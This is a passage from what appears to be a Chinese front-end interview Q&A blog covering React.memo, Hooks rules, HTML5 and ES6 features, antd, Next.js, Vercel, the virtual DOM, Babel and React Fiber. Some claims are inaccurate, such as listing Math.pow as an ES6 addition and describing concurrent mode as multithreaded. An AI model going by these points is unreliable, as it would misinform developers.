Component，HOC），用于性能优化函数组件。它的主要作用是将函数组件的渲染结果进行浅层比较，如果组件的输入属性（props）没有发生变化，则复用上一次的渲染结果，从而避免不必要的重新渲染。</p><p><code>React.memo</code> 的使用方法非常简单，只需将函数组件包裹在 <code>React.memo</code> 函数中即可。例如：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-comment">/* 组件的渲染逻辑 */</span><br>&#125;);<br></code></pre></td></tr></table></figure><p>下面是 <code>React.memo</code> 的实现原理：</p><ol><li><p>当使用 <code>React.memo</code> 包裹函数组件时，它会返回一个新的优化后的组件。</p></li><li><p>在新的组件中，<code>React.memo</code> 会在组件的渲染前检查传入的 <code>props</code> 是否发生了变化。</p></li><li><p>如果新的 <code>props</code> 与上一次渲染时的 <code>props</code> 浅层比较（使用 <code>Object.is</code> 进行比较）相等，则 <code>React.memo</code> 将跳过组件的渲染，直接返回上一次渲染的结果。这是因为在这种情况下，组件的输出不会因为输入属性的变化而改变，所以可以复用上一次的结果，提高性能。</p></li><li><p>如果新的 <code>props</code> 与上一次不相等，<code>React.memo</code> 会执行组件的渲染逻辑，并将新的输出作为组件的结果返回。</p></li></ol><p>总之，<code>React.memo</code> 通过浅层比较组件的输入属性，帮助避免了在没有必要的情况下重新渲染函数组件，从而提高了 React 应用的性能。这特别有助于那些接收频繁变化但实际上渲染结果很少改变的组件。不过需要注意的是，对于复杂的数据结构，浅层比较可能会产生误判，因此需要谨慎使用。如果组件的输入属性包含深层嵌套的对象或数组，最好考虑使用 <code>useMemo</code> 或 <code>useCallback</code> 进行更精确的优化。</p><h3 id="15、react的hooks为什么不能放在函数中"><a href="#15、react的hooks为什么不能放在函数中" class="headerlink" title="15、react的hooks为什么不能放在函数中"></a>15、react的hooks为什么不能放在函数中</h3><p>React 的 Hooks 是一种在函数组件中添加状态管理和生命周期特性的方式，但有一个重要的规则是 Hooks 必须在 React 函数组件的顶层使用，不能放在条件语句、循环语句或嵌套函数中。这个规则是由 React 设计的，主要有以下原因：</p><ol><li><p><strong>保持 Hook 的调用顺序稳定：</strong> Hooks 的调用顺序在每次渲染时必须保持稳定不变。这是因为 React 依赖于 Hooks 的调用顺序来追踪组件状态，如果 Hooks 在组件的不同渲染中的顺序发生变化，可能会导致状态错误或其他不一致性。将 Hooks 放在函数的内部会导致每次渲染时重新声明这些 Hooks，破坏了稳定性。</p></li><li><p><strong>便于理解和维护：</strong> 将 Hooks 放在函数的顶层可以使组件的结构更加清晰和直观，减少了嵌套和条件语句对代码的复杂性。这样也更容易进行代码审查、调试和维护。</p></li><li><p><strong>规避性能问题：</strong> 在条件语句或循环中放置 Hooks 可能导致性能问题。每次条件判断或循环迭代时，都会导致 Hooks 被多次调用，可能会不必要地引发副作用，导致不稳定的行为。</p></li></ol><p>举个例子，下面是一个错误的示例，将 Hooks 放在条件语句中：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">if</span> (props.<span class="hljs-property">condition</span>) &#123;<br>    <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 错误！不能在条件语句中使用 Hooks</span><br>  &#125;<br><br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>正确的做法是将 Hooks 放在函数的顶层，确保每次渲染都按照相同的顺序调用它们：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 正确！在函数顶层使用 Hooks</span><br><br>  <span class="hljs-keyword">if</span> (props.<span class="hljs-property">condition</span>) &#123;<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br><br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>总之，为了确保 React 组件的正确运行和可维护性，应该遵循 Hooks 的规则，将它们放在函数的顶层使用，而不是在条件语句、循环或嵌套函数中。这有助于避免潜在的问题，并使代码更易于理解和维护。</p><h3 id="16、HTML5新特性"><a href="#16、HTML5新特性" class="headerlink" title="16、HTML5新特性"></a>16、HTML5新特性</h3><p>HTML5 是 HTML 的第五个主要版本，引入了许多新特性和改进，使得 Web 开发更加强大和丰富。以下是 HTML5 的一些主要新特性：</p><ol><li><p><strong>语义化标签：</strong> HTML5 引入了一些新的语义化标签，如 <code>&lt;header&gt;</code>、<code>&lt;nav&gt;</code>、<code>&lt;section&gt;</code>、<code>&lt;article&gt;</code>、<code>&lt;footer&gt;</code> 等，用于更清晰地表示文档的结构和内容，提高页面的可读性和可维护性。</p></li><li><p><strong>多媒体支持：</strong> HTML5 提供了 <code>&lt;audio&gt;</code> 和 <code>&lt;video&gt;</code> 标签，使得在网页中嵌入音频和视频更加容易。它还支持音频和视频的流媒体播放、字幕、音轨选择等功能。</p></li><li><p><strong>画布和绘图：</strong> HTML5 引入了 <code>&lt;canvas&gt;</code> 标签，允许开发者使用 JavaScript 在网页上绘制图形、动画和交互性元素，创建复杂的图形应用程序。</p></li><li><p><strong>本地存储：</strong> HTML5 提供了本地存储选项，如 Web Storage 和 IndexedDB，使得网页可以在客户端存储数据，以提高性能和离线访问能力。</p></li><li><p><strong>新表单元素：</strong> HTML5 引入了一些新的表单元素，如 <code>&lt;input type=&quot;date&quot;&gt;</code>、<code>&lt;input type=&quot;email&quot;&gt;</code>、<code>&lt;input type=&quot;url&quot;&gt;</code> 等，以提高表单输入的精确性和用户体验。</p></li><li><p><strong>拖放功能：</strong> HTML5 支持拖放操作，允许用户拖拽元素并将其放置到其他地方，这为实现拖放功能提供了原生支持。</p></li><li><p><strong>地理位置信息：</strong> HTML5 提供了 Geolocation API，允许网页获取用户设备的地理位置信息，用于创建位置相关的应用和服务。</p></li><li><p><strong>WebSocket：</strong> HTML5 引入了 WebSocket 协议，支持双向通信，使得浏览器和服务器之间的实时通信更加高效。</p></li><li><p><strong>Web Workers：</strong> HTML5 支持 Web Workers，允许在后台线程中运行 JavaScript，提高了多线程处理和计算密集型任务的能力。</p></li><li><p><strong>SVG 支持：</strong> HTML5 增强了对可伸缩矢量图形（SVG）的支持，使得创建矢量图形和图表更加容易。</p></li><li><p><strong>响应式 Web 设计：</strong> HTML5 促进了响应式 Web 设计的发展，通过媒体查询和弹性布局使得网页能够适应不同设备和屏幕尺寸。</p></li><li><p><strong>语音识别和语音合成：</strong> HTML5 引入了 Speech API，支持语音识别和语音合成功能，用于创建语音控制和交互的应用程序。</p></li><li><p><strong>新的标签属性：</strong> HTML5 引入了许多新的标签属性，如 <code>data-*</code> 属性、<code>contenteditable</code> 属性、<code>placeholder</code> 属性等，用于增强标签的功能和样式。</p></li></ol><p>这些 HTML5 新特性不仅丰富了 Web 开发的功能和体验，还提高了性能、安全性和可访问性，使得构建现代 Web 应用更加便捷和强大。</p><h3 id="17、ES6新特性"><a href="#17、ES6新特性" class="headerlink" title="17、ES6新特性"></a>17、ES6新特性</h3><p>ECMAScript 6（ES6），也称为 ECMAScript 2015，是 JavaScript 的一个重要更新版本，引入了许多新特性和语法改进，以提高代码的可读性、可维护性和功能性。以下是 ES6 中的一些重要新特性：</p><ol><li><p><strong>块级作用域（Block Scope）：</strong> 引入 <code>let</code> 和 <code>const</code> 关键字，使变量可以在块级作用域内定义，而不再局限于函数作用域。</p></li><li><p><strong>箭头函数（Arrow Functions）：</strong> 提供了一种更简洁的函数声明语法，同时修正了函数内部 <code>this</code> 的指向问题。</p></li><li><p><strong>模板字符串（Template Strings）：</strong> 使用反引号 <code>`</code> 来创建多行字符串和嵌入表达式，使字符串拼接更加方便。</p></li><li><p><strong>解构赋值（Destructuring Assignment）：</strong> 可以从数组或对象中提取值并赋给变量，简化了变量的声明和赋值过程。</p></li><li><p><strong>默认参数（Default Parameters）：</strong> 允许函数参数设置默认值，当参数未传递时使用默认值。</p></li><li><p><strong>展开运算符（Spread Operator）：</strong> 用于数组和对象的展开操作，可以将数组元素或对象属性扩展到另一个数组或对象中。</p></li><li><p><strong>剩余参数（Rest Parameters）：</strong> 允许将函数的剩余参数合并成一个数组，方便处理不定数量的参数。</p></li><li><p><strong>类和继承（Classes and Inheritance）：</strong> 引入了 <code>class</code> 关键字，使得对象的定义和继承更加清晰和面向对象。</p></li><li><p><strong>模块化（Modules）：</strong> 提供了 <code>import</code> 和 <code>export</code> 关键字，用于模块化开发，帮助组织和管理代码。</p></li><li><p><strong>迭代器和生成器（Iterators and Generators）：</strong> 引入 <code>Symbol.iterator</code> 和 <code>function*</code>，支持可迭代对象和生成器函数，简化了异步编程。</p></li><li><p><strong>Promise：</strong> 提供了原生支持的 <code>Promise</code> 对象，用于处理异步操作，解决了回调地狱问题。</p></li><li><p><strong>Set 和 Map：</strong> 引入了 <code>Set</code> 和 <code>Map</code> 数据结构，提供了更灵活的数据存储和查询方式。</p></li><li><p><strong>Proxy 和 Reflect：</strong> <code>Proxy</code> 对象允许自定义对象的行为，<code>Reflect</code> 对象提供了一组用于操作对象的方法。</p></li><li><p><strong>Symbol：</strong> 引入了符号类型，用于创建唯一标识符，可以用于对象属性和迭代器等场景。</p></li><li><p><strong>模块化加载（Module Loading）：</strong> 引入了模块加载系统，可以异步加载模块，提高应用程序的性能和可维护性。</p></li><li><p><strong>String 扩展方法：</strong> 提供了许多新的字符串处理方法，如 <code>startsWith</code>、<code>endsWith</code>、<code>includes</code> 等。</p></li><li><p><strong>数字扩展方法：</strong> 提供了一些新的数字处理方法，如 <code>Number.isNaN</code>、<code>Number.isInteger</code> 等。</p></li><li><p><strong>新的数据结构：</strong> 引入了 <code>TypedArray</code>、<code>WeakSet</code>、<code>WeakMap</code> 等新的数据结构。</p></li><li><p><strong>更丰富的数学操作：</strong> 引入了 <code>Math</code> 对象的新方法，如 <code>Math.pow</code>、<code>Math.sign</code>、<code>Math.log10</code> 等。</p></li><li><p><strong>对象字面量扩展：</strong> 允许在对象字面量中使用简写属性名、计算属性名等。</p></li></ol><p>ES6 的引入使 JavaScript 变得更加现代化和功能丰富，让开发者可以更高效地编写清晰、可维护的代码。这些特性大大提升了 JavaScript 的编程体验和能力。</p><h3 id="18、antd为什么能按需加载"><a href="#18、antd为什么能按需加载" class="headerlink" title="18、antd为什么能按需加载"></a>18、antd为什么能按需加载</h3><p>Ant Design（antd）能够实现按需加载是因为它使用了webpack的模块系统以及babel插件来实现这一功能。</p><p>具体来说，antd通过以下几个步骤来实现按需加载：</p><ol><li><p><strong>组件库的模块化</strong>：Ant Design将每个组件都拆分成独立的模块，每个模块对应一个文件。这样做的好处是可以单独引入需要的组件，而不必加载整个组件库。</p></li><li><p><strong>babel-plugin-import 插件</strong>：antd提供了一个名为<code>babel-plugin-import</code>的Babel插件，它能够在代码编译过程中，将导入的组件库模块转化为按需加载的形式。</p><p>例如，如果你在代码中引入一个antd的组件：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Button</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;antd&#x27;</span>;<br></code></pre></td></tr></table></figure><p>使用<code>babel-plugin-import</code>插件后，它会将上述代码转化为按需加载的形式：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">var</span> _button = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;antd/lib/button&#x27;</span>);<br><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;antd/lib/button/style&#x27;</span>);<br></code></pre></td></tr></table></figure><p>这样只会加载<code>Button</code>组件所需的代码，而不会加载整个antd组件库。</p></li><li><p><strong>webpack的代码分割</strong>：webpack是一个模块打包工具，它能够将多个模块打包成一个或多个bundle文件。antd利用webpack的代码分割功能，确保在构建项目时只打包所需的组件，而不是全部组件。</p></li></ol><p>总的来说，通过以上步骤，antd实现了在项目中按需加载组件，从而减小了最终构建后的文件体积，提升了应用的性能和加载速度。这也是许多现代前端框架和库的常用优化策略之一。</p><h3 id="19、hooks解决了啥、注意事项"><a href="#19、hooks解决了啥、注意事项" class="headerlink" title="19、hooks解决了啥、注意事项"></a>19、hooks解决了啥、注意事项</h3><p>React Hooks 是 React 16.8 版本引入的功能，它们解决了 React 类组件的一些问题，并提供了更灵活、可复用和可测试的组件代码编写方式。以下是 React Hooks 解决的问题以及一些注意事项：</p><p><strong>React Hooks 解决的问题：</strong></p><ol><li><p><strong>状态逻辑复用</strong>：在类组件中，状态逻辑通常需要抽取到高阶组件（HOC）或渲染属性（Render Props）中以实现复用。Hooks 允许你在函数组件之间共享状态逻辑，使代码更具可读性和可维护性。</p></li><li><p><strong>组件复杂性降低</strong>：Hooks 可以将一个组件的生命周期相关逻辑（如 componentDidMount、componentDidUpdate 等）拆分成多个独立的函数，使组件更易于理解和维护。</p></li><li><p><strong>避免 Class 的限制</strong>：Hooks 允许你在无需编写类组件的情况下使用 React 的核心功能，如状态管理、副作用（例如 useEffect）、context 等。</p></li><li><p><strong>更简单的副作用管理</strong>：<code>useEffect</code> 钩子使副作用管理更加直观，能够取代类组件的 <code>componentDidMount</code>、<code>componentDidUpdate</code> 和 <code>componentWillUnmount</code> 生命周期方法。</p></li><li><p><strong>减少样板代码</strong>：Hooks 可以帮助你减少类组件中的样板代码，例如构造函数、绑定方法和 this 引用。</p></li></ol><p><strong>React Hooks 使用的注意事项：</strong></p><ol><li><p><strong>仅在函数组件中使用</strong>：Hooks 只能在函数组件中使用，不能在类组件中使用。如果你需要在类组件中使用相似的功能，可以考虑使用 HOC 或 Render Props。</p></li><li><p><strong>不要在循环、嵌套函数、条件语句中使用 Hooks</strong>：Hooks 应该始终在函数组件的最顶层使用，不要在循环、条件语句或嵌套函数中使用。</p></li><li><p><strong>使用规则依赖性</strong>：<code>useEffect</code> 钩子的回调函数中，确保只依赖于那些在回调内部使用的变量。如果需要使用外部变量，将其包含在 <code>useEffect</code> 的依赖数组中，以便正确捕获变化。</p></li><li><p><strong>自定义 Hook 命名约定</strong>：自定义 Hooks 应该以 “use” 开头，以便在代码中识别它们是钩子。例如，<code>useMyCustomHook</code>。</p></li><li><p><strong>避免过度使用 Hooks</strong>：虽然 Hooks 提供了强大的功能，但不要过度使用它们。在某些情况下，使用类组件可能更合适。</p></li></ol><p>总的来说，React Hooks 提供了更现代和灵活的方式来编写 React 组件，但仍然需要遵循一些最佳实践和注意事项，以确保代码的正确性和可维护性。</p><h3 id="20、介绍一下next-js"><a href="#20、介绍一下next-js" class="headerlink" title="20、介绍一下next.js"></a>20、介绍一下next.js</h3><p>Next.js 是一个用于构建现代、灵活、可扩展的 React 应用程序的React 框架。它提供了许多功能和最佳实践，以简化前端应用程序的开发流程，并帮助你构建高性能、SEO 友好、服务器渲染（SSR）和静态生成（SSG）的网站。以下是 Next.js 的一些主要特点和优点：</p><ol><li><p>**服务器渲染 (SSR) 和静态生成 (SSG)**：Next.js 提供了服务器渲染和静态生成的能力，这意味着你可以在服务器上生成页面，提供更快的加载速度和更好的 SEO。你可以选择使用其中一种或两者结合使用。</p></li><li><p>**热模块替换 (HMR)**：Next.js 支持热模块替换，可以在开发过程中实时更新页面，无需手动刷新浏览器。</p></li><li><p><strong>自动代码拆分</strong>：Next.js 自动将应用程序代码拆分为较小的块，以提高页面加载性能。它只会发送客户端所需的代码，而不会发送整个应用程序。</p></li><li><p><strong>文件系统路由</strong>：使用文件和文件夹结构来定义页面路由，这使得路由配置简单直观。例如，<code>/pages/index.js</code> 表示主页，<code>/pages/about.js</code> 表示关于页面。</p></li><li><p><strong>数据获取</strong>：Next.js 提供了一组用于数据获取的方法，包括 <code>getServerSideProps</code>、<code>getStaticProps</code> 和 <code>getInitialProps</code>。这些方法使得从外部数据源获取数据变得容易，同时支持 SSR 和 SSG。</p></li><li><p><strong>自动预取</strong>：Next.js 会自动预取用户可能在未来导航到的页面，以提高用户体验。</p></li><li><p><strong>TypeScript 支持</strong>：Next.js 对 TypeScript 有很好的支持，可以帮助你在项目中使用类型安全的 JavaScript。</p></li><li><p><strong>插件系统</strong>：Next.js 允许你使用插件来扩展和定制功能，以适应项目的需要。</p></li><li><p><strong>静态导出</strong>：Next.js 支持将整个应用程序导出为静态 HTML 文件，以便部署到各种托管环境，如静态文件托管、CDN、服务器等。</p></li><li><p><strong>社区活跃</strong>：Next.js 拥有一个庞大的社区，有丰富的文档、示例和第三方库，可以加速开发。</p></li></ol><p>总之，Next.js 是一个功能强大的 React 框架，适用于构建现代的、高性能的 Web 应用程序。它通过提供一组有用的功能来简化开发过程，同时也提供了多种部署选项，使得构建高质量的应用变得更加容易。无论你是要构建单页面应用、多页面应用、博客、电子商务网站还是任何其他类型的 Web 应用，Next.js 都是一个值得考虑的选择。</p><h3 id="21、vercel"><a href="#21、vercel" class="headerlink" title="21、vercel"></a>21、vercel</h3><p>Vercel 是一个现代化的云平台，专注于托管和部署 Web 应用程序。它提供了一系列工具和服务，旨在简化开发者的工作流程，使他们能够轻松地将网站、应用程序和静态资产部署到全球性的 CDN（内容分发网络）上。以下是关于 Vercel 的一些主要特点和优势：</p><ol><li><p><strong>简化的部署流程</strong>：Vercel 提供了一个简单的部署流程，只需将你的代码库连接到 Vercel，它就会自动构建、部署和托管你的应用程序。这意味着开发者可以专注于编写代码，而不必担心服务器设置和复杂的部署过程。</p></li><li><p><strong>支持多种编程语言和框架</strong>：Vercel 不仅支持前端框架（如 React、Vue、Angular 等），还支持后端框架（如 Node.js、Python、Ruby 等），以及静态网站生成器（如 Next.js、Nuxt.js、Hugo 等）。</p></li><li><p><strong>全球 CDN 分发</strong>：Vercel 部署的应用程序和资产会被分发到全球性的 CDN 上，确保用户能够快速访问你的应用程序，减少加载时间。</p></li><li><p><strong>自动 HTTPS</strong>：Vercel 提供自动的 HTTPS 支持，保护你的应用程序和用户数据。无需手动配置 SSL 证书。</p></li><li><p><strong>Serverless 部署</strong>：Vercel 支持 Serverless 架构，可以轻松部署无服务器函数和 API 端点。它还与 AWS Lambda 集成，提供了无服务器计算的能力。</p></li><li><p><strong>多环境部署</strong>：你可以轻松创建和管理不同环境（如开发、测试、生产）的部署，以及自定义部署规则。</p></li><li><p><strong>团队协作</strong>：Vercel 支持团队协作，多人可以共同维护和部署项目，同时提供了 RBAC（基于角色的访问控制）功能。</p></li><li><p><strong>实时日志和监控</strong>：Vercel 提供实时日志和监控工具，让你能够追踪应用程序的性能和问题。</p></li><li><p><strong>扩展性和定制性</strong>：Vercel 提供了强大的自动化工具，但也允许你定制构建和部署流程，以满足你的特定需求。</p></li><li><p><strong>丰富的生态系统</strong>：Vercel 有一个庞大的开发者社区和生态系统，包括文档、示例、插件和第三方集成，为开发者提供了丰富的资源和工具。</p></li></ol><p>总之，Vercel 是一个强大而易于使用的云平台，适用于前端和后端开发者，以及构建 Web 应用程序、静态网站和 Serverless 函数的项目。它的简化部署流程、全球 CDN 分发、自动 HTTPS 支持和多种框架的兼容性，使其成为开发者构建和托管现代 Web 应用程序的理想选择。</p><h3 id="22、VDOM"><a href="#22、VDOM" class="headerlink" title="22、VDOM"></a>22、VDOM</h3><p>虚拟DOM（Virtual DOM）是一种用于提高Web应用性能的技术，通常与React等现代JavaScript库和框架一起使用。虚拟DOM的核心思想是将整个页面的DOM结构表示为一个轻量级的JavaScript对象树，称为虚拟DOM树。通过比较前后两次虚拟DOM树的差异，可以在必要时仅更新页面上实际发生变化的部分，从而减少了DOM操作，提高了页面渲染性能。</p><p>以下是关于 VDOM 的一些重要概念和工作原理：</p><ol><li><p><strong>创建虚拟 DOM</strong>：</p><p>当应用程序状态发生变化时，框架会生成一个新的虚拟 DOM 树，该树包含了所有组件的当前状态和结构信息。这个虚拟 DOM 树是一个轻量级的 JavaScript 对象，它代表了应用程序的视图结构。</p></li><li><p><strong>比较虚拟 DOM</strong>：</p><p>一旦新的虚拟 DOM 树被创建，框架会将新的虚拟 DOM 树与先前的虚拟 DOM 树进行比较，以找出两者之间的差异。这个过程通常被称为 “reconciliation”。</p></li><li><p><strong>计算差异</strong>：</p><p>在比较虚拟 DOM 树时，框架会计算出需要进行的 DOM 更新操作，例如添加、删除、更新元素等。这些更新操作会被保存在一个 “差异” 对象中。</p></li><li><p><strong>应用差异</strong>：</p><p>一旦计算出差异，框架会将这些差异应用于实际的 DOM，以使 DOM 结构与虚拟 DOM 树保持一致。这个过程通常被称为 “patching”。</p></li><li><p><strong>性能优势</strong>：</p><p>VDOM 的主要优势在于它可以在内存中高效地进行比较和计算，而不需要频繁地操作实际的 DOM。这减少了浏览器的重排（reflow）和重绘（repaint）操作，从而提高了页面的性能和响应速度。</p></li><li><p><strong>一致性和跨平台</strong>：</p><p>VDOM 抽象了实际 DOM，使得它在不同的浏览器和平台上具有一致的行为。这使得开发者不需要担心浏览器兼容性问题，可以更容易地构建跨平台应用。</p></li><li><p><strong>React 中的 VDOM</strong>：</p><p>React 是最著名的使用 VDOM 技术的框架之一。React 使用虚拟 DOM 来管理组件的渲染和更新，它通过比较前后两个虚拟 DOM 树来确定需要进行的 DOM 更新，从而提高了 React 应用程序的性能。</p></li></ol><p>总之，VDOM 是一种用于优化前端性能的技术，通过在内存中比较虚拟 DOM 树来减少不必要的 DOM 操作，从而提高了页面的性能和响应速度。它在现代前端框架中得到了广泛的应用，例如 React、Vue 等。</p><p>以下是虚拟DOM的工作原理和优势：</p><p><strong>工作原理：</strong></p><ol><li><p><strong>初始化：</strong> 当应用首次加载时，会通过JavaScript代码创建一个虚拟DOM树，该树与实际的DOM结构一一对应。这个虚拟DOM树是一个轻量级的JavaScript对象，包含了所有页面元素的层次结构和属性信息。</p></li><li><p><strong>渲染：</strong> 当数据发生变化时，React或其他支持虚拟DOM的库将重新渲染虚拟DOM树，生成新的虚拟DOM树。</p></li><li><p><strong>对比差异：</strong> 新旧虚拟DOM树会进行比较，找出它们之间的差异，这个过程称为”协调”。虚拟DOM可以高效地检测到哪些元素需要添加、更新或删除，而不需要直接操作实际的DOM。</p></li><li><p><strong>应用变化：</strong> 根据差异，虚拟DOM会生成一组最小的DOM操作，只更新实际需要变化的部分。这些DOM操作是高效的，因为它们只影响实际变化的部分，而不是整个页面。</p></li><li><p><strong>重绘页面：</strong> 最后，通过应用这些DOM操作，浏览器会重新绘制页面，但只会重新渲染发生变化的部分，而不是整个页面。</p></li></ol><p><strong>优势：</strong></p><ol><li><p><strong>性能优化：</strong> 虚拟DOM可以显著减少DOM操作的次数，从而提高了页面的渲染性能。因为DOM操作通常是较慢的，减少操作次数可以减少性能开销。</p></li><li><p><strong>跨平台：</strong> 虚拟DOM不仅可以在浏览器中使用，还可以在其他环境中使用，如React Native等。这使得开发跨平台应用更加方便。</p></li><li><p><strong>简化复杂性：</strong> 虚拟DOM可以隐藏底层DOM操作的复杂性，开发人员只需要关注数据和UI的关系，而不必手动管理DOM。</p></li><li><p><strong>提高开发效率：</strong> 虚拟DOM使得组件化开发变得更容易，开发人员可以更快速地构建和维护大规模应用。</p></li></ol><p>尽管虚拟DOM在性能和开发效率方面具有很多优势，但也需要注意，它并不是适用于所有情况的解决方案。在某些情况下，简单的应用可能不需要虚拟DOM，因为DOM操作不会造成性能瓶颈。因此，在选择是否使用虚拟DOM时，应根据具体的项目需求和性能优化要求来决策。</p><h3 id="23、谈谈你对Babel的理解，并说下它的原理"><a href="#23、谈谈你对Babel的理解，并说下它的原理" class="headerlink" title="23、谈谈你对Babel的理解，并说下它的原理"></a>23、谈谈你对Babel的理解，并说下它的原理</h3><p>Babel 是一个 JavaScript 编译器，用于将最新的 JavaScript 语法（如 ES6、ES7）转换为浏览器兼容的 ES5 语法。Babel 的主要功能是确保你编写的代码在所有浏览器中都能正常运行，不受浏览器对新特性支持程度的影响。</p><p>Babel 的原理：</p><ol><li>解析（Parsing）：Babel 首先将源代码解析为一个抽象语法树（Abstract Syntax Tree，简称 AST）。解析过程中，Babel 将源代码分解成词素（Tokens），然后根据语法规则将词素组合成 AST。AST 是一种树状结构，用于表示源代码的语法结构。</li><li>转换（Transforming）：在 AST 的基础上，Babel 使用插件（plugins）和预设（presets）进行转换。插件是用于实现具体语法转换或优化的功能模块，例如将箭头函数转换为普通函数。预设是一组插件的集合，用于处理一组相关的语法特性，如 ES2015+ 的新特性。</li><li>生成（Generating）：在转换阶段完成后，Babel 将修改后的 AST 转换回 JavaScript 代码。生成阶段可以保留原始代码中的格式和注释，或者使用压缩插件对代码进行优化。</li></ol><p>Babel 允许开发者使用最新的 JavaScript 语法和特性，同时确保代码在各种浏览器中兼容。通过对代码进行转换和优化，Babel 可以提高代码的可维护性和性能。</p><h3 id="24、说一下对fiber架构的理解"><a href="#24、说一下对fiber架构的理解" class="headerlink" title="24、说一下对fiber架构的理解"></a>24、说一下对fiber架构的理解</h3><p>Fiber架构是React框架的一种内部架构，用于处理组件的调度、渲染和更新。它于React 16版本中引入，旨在提高React应用程序的性能和用户体验。以下是对Fiber架构的理解：</p><ol><li><p><strong>可中断性：</strong> Fiber架构引入了可中断性，这意味着React可以在渲染过程中暂停并重新安排任务的执行。这对于保持应用的响应性非常重要，因为它允许浏览器在渲染期间处理其他重要的任务，例如用户输入或网络请求。</p></li><li><p><strong>优先级调度：</strong> Fiber引入了任务优先级的概念，将不同任务划分为不同的优先级。这使得React可以更好地响应用户交互，例如在用户与界面进行交互时优先渲染关键组件，以提供更好的用户体验。</p></li><li><p><strong>增量渲染：</strong> Fiber支持增量渲染，这意味着React可以将渲染工作分成多个小任务，并根据其优先级逐步执行。这降低了首次加载和更新时的渲染延迟，从而提高了性能。</p></li><li><p><strong>错误边界：</strong> Fiber允许React组件定义错误边界，这些错误边界可以捕获和处理组件中的错误，从而避免整个应用程序崩溃。这提高了应用程序的可靠性。</p></li><li><p><strong>可预测的渲染：</strong> Fiber的目标之一是使React的渲染过程更可预测。这有助于开发人员更好地理解和控制组件的渲染行为。</p></li><li><p><strong>并发模式：</strong> Fiber的架构为未来的并发模式打下了基础。并发模式允许React在多个线程中同时执行任务，以进一步提高性能。</p></li></ol><p>总的来说，Fiber架构的引入使React更具性能、可扩展性和可维护性。它改善了React在各种应用场景下的表现，并为未来的React版本和功能增加了更多的潜力。虽然Fiber对于大多数React开发者是透明的，但它在React内部对渲染和更新过程的管理方面做出了巨大的改进。</p><h3 id="25、比较react的类组件和函数组件"><a href="#25、比较react的类组件和函数组件" class="headerlink" title="25、比较react的类组件和函数组件"></a>25、比较react的类组件和函数组件</h3><p>React 中有两种主要类型的组件：类组件（Class Components）和函数组件（Function Components）。类组件和函数组件最大的不同还在于代码思路方面的不同。类组件是面向对象编程思维方式，函数组件是面向过程编程思维方式。React的设计思路更推崇组合，而不是继承。在类组件中大量使用继承会造成组件过重，功能难以拆分。</p><p><strong>类组件（Class Components）：</strong></p><ol><li><p><strong>基于类的定义：</strong> 类组件是通过创建一个继承自 <code>React.Component</code> 或 <code>React.PureComponent</code> 的JavaScript类来定义的。它们可以包含状态（state）和生命周期方法。</p></li><li><p><strong>状态管理：</strong> 类组件可以通过 <code>this.state</code> 来管理本地状态，通过 <code>this.setState()</code> 方法来更新状态。这使得它们适用于复杂的组件状态管理。</p></li><li><p><strong>生命周期方法：</strong> 类组件具有一系列生命周期方法，如 <code>componentDidMount</code>、<code>componentDidUpdate</code> 和 <code>componentWillUnmount</code> 等，可以在不同的阶段执行操作，例如数据获取、订阅管理、DOM操作等。</p></li><li><p><strong>容器组件：</strong> 由于类组件具有状态和生命周期，它们通常被用作容器组件，用于管理和组织UI组件。</p></li><li><p><strong>React Hooks：</strong> 虽然类组件是React的传统方式，但React 16.8版本引入了React Hooks，使函数组件能够处理状态和生命周期，从而减少了对类组件的需求。</p></li></ol><p><strong>函数组件（Function Components）：</strong></p><ol><li><p><strong>基于函数的定义：</strong> 函数组件是通过编写JavaScript函数来定义的。它们通常比类组件更简洁。</p></li><li><p><strong>状态管理：</strong> 函数组件可以使用React Hooks（如 <code>useState</code>、<code>useEffect</code> 等）来管理状态。这使得状态管理更简单且更具可读性。</p></li><li><p><strong>生命周期：</strong> 函数组件通过 <code>useEffect</code> 钩子来处理副作用，例如数据获取、订阅管理和DOM操作。尽管没有类组件中那么多生命周期方法，但Hooks提供了足够的灵活性。</p></li><li><p><strong>函数式编程：</strong> 函数组件更符合函数式编程的思维方式，它们更容易测试和理解，尤其是在编写纯函数时。</p></li><li><p><strong>性能：</strong> 